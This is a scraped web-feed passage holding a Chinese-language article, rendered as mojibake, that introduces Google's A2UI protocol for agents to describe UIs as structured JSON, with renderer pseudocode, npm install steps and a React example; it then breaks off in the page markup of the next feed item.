<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<h2 data-id="heading-1">äºŒã€A2UIçš„æœ¬è´¨ï¼Œä¸€ä¸ªåè®®è€Œéæ¡†æ¶</h2>
<h2 data-id="heading-2">1. ä¸€ç§å£°æ˜å¼UIåè®®</h2>
<p>A2UIçš„æ ¸å¿ƒä¸æ˜¯Reactã€Vue æˆ–Flutterç»„ä»¶ï¼Œè€Œæ˜¯ä¸€å¥—å£°æ˜å¼UIåè®®ã€‚ä¸ä»¥å¾€çš„è¾“å‡ºä¸åŒï¼ŒAgentä¸å†è¾“å‡º HTML/JSXï¼Œè€Œæ˜¯è¾“å‡ºç±»ä¼¼ä¸‹é¢çš„ç»“æ„åŒ–JSONï¼š</p>
<pre><code class="hljs language-css" lang="css">{
  "surfaceUpdate": {
    "surfaceId": <span class="hljs-string">"main"</span>,
    <span class="hljs-string">"components"</span>: [
      {
        "id": <span class="hljs-string">"name"</span>,
        <span class="hljs-string">"component"</span>: {
          "type": <span class="hljs-string">"TextField"</span>,
          <span class="hljs-string">"props"</span>: { "<span class="hljs-selector-tag">label</span>": <span class="hljs-string">"å§“å"</span> }
        }
      }
    ]
  }
}
</code></pre>
<p>è€Œå‰ç«¯åªè´Ÿè´£ä¸€ä»¶äº‹ï¼Œå°±æ˜¯æŠŠç»„ä»¶çš„ç»“æ„åŒ–æè¿°æ˜ å°„æˆçœŸå®çš„æœ¬åœ° UIã€‚</p>
<h2 data-id="heading-3">2. å®‰å…¨æ€§å¯æ§</h2>
<p>ä¸ºä»€ä¹ˆä¸è®© Agent ç›´æ¥å†™å‰ç«¯ä»£ç ï¼Ÿè¿™æ˜¯ A2UI éå¸¸é‡è¦çš„ä¸€ç‚¹è®¾è®¡å“²å­¦ï¼š</p>
<p>â— Agentç”Ÿæˆ HTML/JSä»£ç ï¼šå­˜åœ¨å®‰å…¨é£é™©ï¼Œé£é™©ä¸å¯é </p>
<p>â— Agentç”Ÿæˆç»“æ„åŒ–JSONï¼šå‰ç«¯åªæ¸²æŸ“ç™½åå•ç»„ä»¶ï¼Œé£é™©æ›´åŠ å¯æ§</p>
<p>Googleå®˜æ–¹çš„è¡¨è¿°è¯´è¿™æ ·è®¾è®¡ä½¿å¾—Agentçš„è¾“å‡ºåƒæ•°æ®ä¸€æ ·å®‰å…¨ï¼Œåƒä»£ç ä¸€æ ·è¡¨è¾¾ã€‚</p>
<h2 data-id="heading-4">3. è·¨å¹³å°æ¸²æŸ“</h2>
<p>A2UI çš„ç»„ä»¶æ˜¯æŠ½è±¡çš„ï¼Œä¸€æ¬¡ç”Ÿæˆï¼Œå¤šç«¯æ¸²æŸ“ï¼ŒAgent å®Œå…¨ä¸å…³å¿ƒå‰ç«¯æŠ€æœ¯æ ˆï¼Œåªæè¿°â€œæˆ‘è¦ä¸€ä¸ªè¾“å…¥æ¡† + ä¸€ä¸ªæŒ‰é’®â€å³å¯æ¸²æŸ“å‡ºåˆé€‚çš„UIç•Œé¢ã€‚</p>

























<table><thead><tr><th>å¹³å°</th><th>æ¸²æŸ“æ–¹å¼</th></tr></thead><tbody><tr><td>Web</td><td>React / Angular / Lit</td></tr><tr><td>iOS</td><td>SwiftUI</td></tr><tr><td>Android</td><td>Compose</td></tr><tr><td>Flutter</td><td>Widget</td></tr></tbody></table>
<h2 data-id="heading-5">4. ä¸æ¨¡å‹è§£è€¦</h2>
<p>A2UIæ˜¯ä¸€ç§åè®®ï¼Œé‚£ä¹ˆå®ƒå°±ä¸æ˜¯å¿…é¡»ä¸Geminiæ¨¡å‹ç»‘å®šã€‚A2UIå¯¹æ¨¡å‹çš„è¦æ±‚åªæœ‰ä¸€ä¸ªï¼š èƒ½ä¸èƒ½ç¨³å®šè¾“å‡ºç»“æ„åŒ– JSONã€‚æ‰€ä»¥å¯¹äºå¸¸è§çš„æ¨¡å‹ä»¥åŠMaaSæä¾›å•†ï¼Œæ¯”å¦‚ï¼š</p>
<p>â— OpenAI</p>
<p>â— Claude</p>
<p>â— Gemini</p>
<p>â— å…¶ä»–æ¨¡å‹/APIæä¾›å•†</p>
<p>éƒ½å®Œå…¨å¯ä»¥ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-6">ä¸‰ã€æŠ€æœ¯åŸç†</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/515998ba9646455696a5c07d7150023e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex5bqm5a2m5Lmg5py65Zmo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478802&amp;x-signature=ZojTGPZ1odIqC%2F%2BDWv6hOg0KQ8s%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p>A2UIä¸»è¦æœ‰ä¸‰å±‚æ¶æ„ï¼Œæ¯ä¸€å±‚éƒ½æœ‰æ¸…æ™°çš„åˆ†å·¥ã€‚</p>
<h2 data-id="heading-7">1. åè®®å±‚ï¼šAgent-to-UI Communication</h2>
<p>æ¯”å¦‚Agentå¯èƒ½ä¼šç”Ÿæˆå¸¦å¦‚ä¸‹ç»“æ„çš„Jsonè¾“å‡ºï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"surfaceUpdate"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"surfaceId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"restaurant-search"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"components"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"search-form"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"component"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Form"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"children"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
            <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"TextField"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"props"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"placeholder"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æœç´¢é¤å…..."</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
            <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Button"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"props"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æœç´¢"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
          <span class="hljs-punctuation">]</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-8">2. æ¸²æŸ“å±‚ï¼šFramework-Agnostic Rendering</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99a9912b709349c4954a427ddca7eb1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex5bqm5a2m5Lmg5py65Zmo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478802&amp;x-signature=oJPDPS31jB9rV3rYQW%2FLLUFF%2FVc%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p>å®¢æˆ·ç«¯ä¸Agentä¹‹é—´æ˜¯æœ‰é¢„å…ˆå®šä¹‰å¥½çš„æ¸²æŸ“é€»è¾‘ï¼Œå½“å®¢æˆ·ç«¯æ”¶åˆ°Agentå‘é€æ¥çš„å¸¦æœ‰ç‰¹æ®Šæ ¼å¼çš„Jsonæ—¶ï¼Œä¼šå¯¹å…¶ä¸­æœ‰æ•ˆéƒ¨åˆ†è¿›è¡Œæ¸²æŸ“ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®¢æˆ·ç«¯æ¸²æŸ“é€»è¾‘ï¼ˆä¼ªä»£ç ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A2UIRenderer</span> {
  <span class="hljs-title function_">render</span>(<span class="hljs-params">component, container</span>) {
    <span class="hljs-keyword">switch</span>(component.<span class="hljs-property">type</span>) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'TextField'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextInput</span>(component.<span class="hljs-property">props</span>);
      <span class="hljs-keyword">case</span> <span class="hljs-string">'Button'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(component.<span class="hljs-property">props</span>);
      <span class="hljs-keyword">case</span> <span class="hljs-string">'Form'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Form</span>(component.<span class="hljs-property">children</span>);
      <span class="hljs-comment">// æ›´å¤šç»„ä»¶...</span>
    }
  }
}
</code></pre>
<h2 data-id="heading-9">3. æ•°æ®å±‚ï¼šåŒå‘æ•°æ®åŒæ­¥</h2>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dataModelUpdate"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"surfaceId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"restaurant-search"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"contents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"key"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"searchResults"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"valueArray"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
          <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"valueMap"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
              <span class="hljs-punctuation">{</span><span class="hljs-attr">"key"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"name"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"valueString"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å·é¦™é˜"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
              <span class="hljs-punctuation">{</span><span class="hljs-attr">"key"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"rating"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"valueNumber"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4.5</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
              <span class="hljs-punctuation">{</span><span class="hljs-attr">"key"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cuisine"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"valueString"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å·èœ"</span><span class="hljs-punctuation">}</span>
            <span class="hljs-punctuation">]</span>
          <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-10">å››ã€å¿«é€Ÿå¼€å§‹</h2>
<h2 data-id="heading-11">1. ç¯å¢ƒå‡†å¤‡</h2>
<p>åœ¨å¼€å§‹ä½¿ç”¨A2UIä¹‹å‰ï¼Œç¡®ä¿å¼€å‘ç¯å¢ƒæ»¡è¶³ä»¥ä¸‹è¦æ±‚ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ£€æŸ¥Node.jsç‰ˆæœ¬ï¼ˆéœ€è¦16.0+ï¼‰</span>
node --version

<span class="hljs-comment"># æ£€æŸ¥npmç‰ˆæœ¬</span>
npm --version
</code></pre>
<h2 data-id="heading-12">2. å®‰è£…æ­¥éª¤</h2>
<h3 data-id="heading-13">æ–¹æ³•1ï¼šä½¿ç”¨å®˜æ–¹æ¨¡æ¿</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å…‹éš†å®˜æ–¹å¿«é€Ÿå¼€å§‹æ¨¡æ¿</span>
git <span class="hljs-built_in">clone</span> https://github.com/google/A2UI.git
<span class="hljs-built_in">cd</span> A2UI/examples/quick-start

<span class="hljs-comment"># å®‰è£…ä¾èµ–</span>
npm install

<span class="hljs-comment"># å¯åŠ¨å¼€å‘æœåŠ¡å™¨</span>
npm start
</code></pre>
<h3 data-id="heading-14">æ–¹æ³•2ï¼šé›†æˆåˆ°ç°æœ‰é¡¹ç›®</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…A2UIæ ¸å¿ƒåº“</span>
npm install @google/a2ui

<span class="hljs-comment"># å®‰è£…æ¸²æŸ“å™¨ï¼ˆä»¥Reactä¸ºä¾‹ï¼‰</span>
npm install @google/a2ui-react

<span class="hljs-comment"># å®‰è£…ç±»å‹å®šä¹‰</span>
npm install -D @types/a2ui
</code></pre>
<h2 data-id="heading-15">äº”ã€ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹</h2>
<p>è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®€å•çš„â€Hello Worldâ€åº”ç”¨ï¼š</p>
<h2 data-id="heading-16">1. åˆ›å»ºAgent</h2>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// agent/hello-agent.js</span>
<span class="hljs-keyword">import</span> { <span class="hljs-type">A2UIAgent</span> } from '<span class="hljs-meta">@google</span>/a2ui';

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloAgent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A2UIAgent</span> </span>{
  async handleMessage(userInput) {
    <span class="hljs-keyword">return</span> {
      surfaceUpdate: {
        surfaceId: <span class="hljs-string">"hello-world"</span>,
        components: [
          {
            id: <span class="hljs-string">"greeting-container"</span>,
            component: {
              <span class="hljs-class"><span class="hljs-keyword">type</span></span>: <span class="hljs-string">"Card"</span>,
              props: {
                title: <span class="hljs-string">"A2UIé—®å€™"</span>,
                variant: <span class="hljs-string">"elevated"</span>
              },
              children: [
                {
                  <span class="hljs-class"><span class="hljs-keyword">type</span></span>: <span class="hljs-string">"Text"</span>,
                  props: {
                    content: `ä½ å¥½ï¼æ‚¨è¾“å…¥çš„æ˜¯ï¼š${userInput}`,
                    size: <span class="hljs-string">"large"</span>
                  }
                },
                {
                  <span class="hljs-class"><span class="hljs-keyword">type</span></span>: <span class="hljs-string">"Button"</span>,
                  props: {
                    text: <span class="hljs-string">"å†æ¬¡é—®å€™"</span>,
                    action: <span class="hljs-string">"greet_again"</span>
                  }
                }
              ]
            }
          }
        ]
      }
    };
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-type">HelloAgent</span>;
</code></pre>
<h2 data-id="heading-17">2. åˆ›å»ºå®¢æˆ·ç«¯æ¸²æŸ“å™¨</h2>
<pre><code class="hljs language-ini" lang="ini">// client/App.jsx
import React, { useState } from 'react'<span class="hljs-comment">;</span>
import { A2UIRenderer } from '@google/a2ui-react'<span class="hljs-comment">;</span>
import HelloAgent from './agent/hello-agent'<span class="hljs-comment">;</span>

function App() {
  const <span class="hljs-section">[messages, setMessages]</span> = useState(<span class="hljs-section">[]</span>)<span class="hljs-comment">;</span>
  const <span class="hljs-section">[userInput, setUserInput]</span> = useState('')<span class="hljs-comment">;</span>

  const <span class="hljs-attr">agent</span> = new HelloAgent()<span class="hljs-comment">;</span>

  const <span class="hljs-attr">handleSendMessage</span> = async () =&gt; {
    const <span class="hljs-attr">response</span> = await agent.handleMessage(userInput)<span class="hljs-comment">;</span>
    setMessages(<span class="hljs-attr">prev</span> =&gt; [...prev, response])<span class="hljs-comment">;</span>
    setUserInput('')<span class="hljs-comment">;</span>
  }<span class="hljs-comment">;</span>

  return (
    &lt;div <span class="hljs-attr">classname</span>=<span class="hljs-string">"app"</span>&gt;
      &lt;main <span class="hljs-attr">classname</span>=<span class="hljs-string">"chat-container"</span>&gt;
        {messages.map((message, index) =&gt; (
          &lt;a2uirenderer <span class="hljs-attr">key</span>=<span class="hljs-string">"{index}"</span> surfaceupdate=<span class="hljs-string">"{message.surfaceUpdate}"</span> <span class="hljs-literal">on</span>action=<span class="hljs-string">"{(action,"</span> data)=<span class="hljs-string">""</span>&gt; {
              console.log('Action triggered:', action, data)<span class="hljs-comment">;</span>
              if (<span class="hljs-attr">action</span> === <span class="hljs-string">'greet_again'</span>) {
                handleSendMessage()<span class="hljs-comment">;</span>
              }
            }}
          /&gt;
        ))}
      &lt;/a2uirenderer&gt;&lt;/main&gt;
      &lt;footer <span class="hljs-attr">classname</span>=<span class="hljs-string">"input-container"</span>&gt;
        &lt;input <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> value=<span class="hljs-string">"{userInput}"</span> <span class="hljs-literal">on</span>change=<span class="hljs-string">"{(e)"</span> ==<span class="hljs-string">""</span>&gt; setUserInput(e.target.value)}
          <span class="hljs-attr">onKeyPress</span>={(e) =&gt; e.key === <span class="hljs-string">'Enter'</span> &amp;&amp; handleSendMessage()}
          <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¾“å…¥æ¶ˆæ¯..."</span>
        /&gt;
        &lt;button <span class="hljs-attr">onclick</span>=<span class="hljs-string">"{handleSendMessage}"</span>&gt;å‘é€&lt;/button&gt;
      &lt;/footer&gt;
    &lt;/div&gt;
  )<span class="hljs-comment">;</span>
}

export default App<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-18">å…­ã€å…³äºA2UIçš„ä¸€äº›ç–‘é—®</h2>
<h2 data-id="heading-19">1. å‰ç«¯éœ€è¦å¼•å…¥A2UIå®˜æ–¹npmåŒ…å—ï¼Ÿ</h2>
<p>ä¸ç”¨ã€‚åªéœ€è¦åœ¨ç°æœ‰ React é¡¹ç›®ä¸­ï¼ŒåŠ ä¸€å±‚ã€ŒA2UI Rendererã€å°±è¡Œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatMessage</span>(<span class="hljs-params">{ msg }</span>) {
  <span class="hljs-keyword">if</span> (msg.<span class="hljs-property">type</span> === <span class="hljs-string">"text"</span>) <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Bubble</span>&gt;</span>{msg.content}<span class="hljs-tag">&lt;/<span class="hljs-name">Bubble</span>&gt;</span></span>;
  <span class="hljs-keyword">if</span> (msg.<span class="hljs-property">type</span> === <span class="hljs-string">"a2ui"</span>) <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">A2UIRenderer</span> <span class="hljs-attr">surface</span>=<span class="hljs-string">{msg.surfaceUpdate}</span> /&gt;</span></span>;
}
</code></pre>
<p>A2UIå®˜æ–¹ SDK æœ¬è´¨ä¸Šä¹Ÿæ˜¯åœ¨åšè¿™ä»¶äº‹ï¼Œåªæ˜¯å¸®ä½ å°è£…å¥½äº†ã€‚</p>
<h2 data-id="heading-20">2. LLM ä¸€å®šè¦è¾“å‡ºç‰¹æ®Š JSONå—ï¼Ÿ</h2>
<p>æ˜¯çš„ï¼Œè¿™æ˜¯ A2UI çš„å…³é”®ã€‚ä½†è¿™å¹¶ä¸æ„å‘³ç€æ‰€æœ‰å›å¤éƒ½è¦ä»¥A2UIçš„æ ¼å¼è¿”å›ã€‚çœŸå®ä¸šåŠ¡ä¸­æ›´åˆç†çš„æ–¹å¼æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹ä¾æ—§ä»¥ä¼ ç»Ÿçš„æ–‡æœ¬å½¢å¼è¿”å›ï¼Œåªæœ‰å½“éœ€è¦ç”¨æˆ·æ“ä½œçš„æ—¶å€™æ‰æ¸²æŸ“ä¸ºA2UIçš„æ ¼å¼ã€‚</p>
<h2 data-id="heading-21">ä¸ƒã€æ€»ç»“</h2>
<p>åœ¨ç¬”è€…çœ‹æ¥ï¼ŒA2UIçš„æ„ä¹‰ä¸åªæ˜¯å¤šäº†ä¸€ç§UIæ–¹æ¡ˆï¼Œè€Œæ˜¯åœ¨äºå®ƒè¡¥é½äº†Agentä»æ€è€ƒåˆ°æ‰§è¡Œçš„æœ€åä¸€ç¯ã€‚å¯¹äºAgentçš„å¼€å‘è€…æ¥è¯´ï¼Œå¯èƒ½ä¸å†éœ€è¦å»å†™å„ç§ä¸šåŠ¡ç›¸å…³çš„ç•Œé¢ï¼Œè€Œæ˜¯å¯ä»¥ä¸“æ³¨äºè®¾è®¡Agentèƒ½åŠ›è¾¹ç•Œã€‚è€ŒAgentçš„ç»ˆæå½¢æ€ï¼Œä¸å†æ˜¯èŠå¤©æœºå™¨äººï¼Œè€Œæ˜¯ä¼šè‡ªå·±æ­ç•Œé¢çš„æ™ºèƒ½ç³»ç»Ÿã€‚ A2UIï¼Œå¯èƒ½æ­£æ˜¯è¿™ä¸ªæ–¹å‘ä¸Šéå¸¸å…³é”®çš„ä¸€æ­¥ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JS-ç»§æ‰¿çš„æ¼”è¿›ä¹‹è·¯ï¼ˆä»åŸå‹é“¾åˆ°ç»„åˆç»§æ‰¿ï¼‰]]></title>    <link>https://juejin.cn/post/7596883689827270719</link>    <guid>https://juejin.cn/post/7596883689827270719</guid>    <pubDate>2026-01-19T14:00:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596883689827270719" data-draft-id="7596926832912793663" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JS-ç»§æ‰¿çš„æ¼”è¿›ä¹‹è·¯ï¼ˆä»åŸå‹é“¾åˆ°ç»„åˆç»§æ‰¿ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-19T14:00:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‘ç°ä¸€åªå¤§å‘†ç“œ"/> <meta itemprop="url" content="https://juejin.cn/user/180747382561607"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JS-ç»§æ‰¿çš„æ¼”è¿›ä¹‹è·¯ï¼ˆä»åŸå‹é“¾åˆ°ç»„åˆç»§æ‰¿ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180747382561607/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‘ç°ä¸€åªå¤§å‘†ç“œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T14:00:37.000Z" title="Mon Jan 19 2026 14:00:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 